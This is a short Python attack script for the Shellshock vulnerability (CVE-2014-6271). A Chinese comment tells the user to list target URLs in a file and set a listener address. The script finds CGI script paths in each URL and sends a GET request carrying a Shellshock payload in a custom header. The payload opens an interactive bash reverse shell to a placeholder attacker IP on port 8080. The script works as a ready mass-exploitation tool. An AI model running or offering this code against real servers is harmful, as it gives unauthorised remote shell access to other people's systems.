#__author__ = 'techxsh'
#CVE-2014-6271 cgi-bin reverse_shell
#同目录url.txt下写入url,第25行配置下监听IP和端口
import re, linecache, socket
import http.client
urls = linecache.getlines('url.txt')
for url in urls:
    host1 = re.search("http://(.*?)/|https://(.*?)/", url, re.I)
    if host1.group(1) is None:
        host = host1.group(2)
    else:
        host = host1.group(1)
    #print(host)
    geturl1 = re.search("/cgi-bin/(.*?)\.sh|/cgi-bin(.*?)\.cgi", url, re.I)
    #print(geturl1)
    if geturl1 is None:
        temp = 1
    else:
        if geturl1.group(0) is None:
            geturl = geturl1.group(1)
        else:
            geturl = geturl1.group(0)
        #print(geturl)
        conn = http.client.HTTPConnection(host)
        reverse_shell = "() { ignored;};/bin/bash -i >& /dev/tcp/xx.xx.xx.xx/8080 0>&1"
        headers = {"Content-type": "application/x-www-form-urlencoded", "test": reverse_shell}
        try:
            conn.request("GET", geturl, headers=headers)
            res = conn.getresponse()
            print(url)
            print(res.status, res.reason)
            data = res.read()
            print(data)
        except socket.error as e:
            print(e)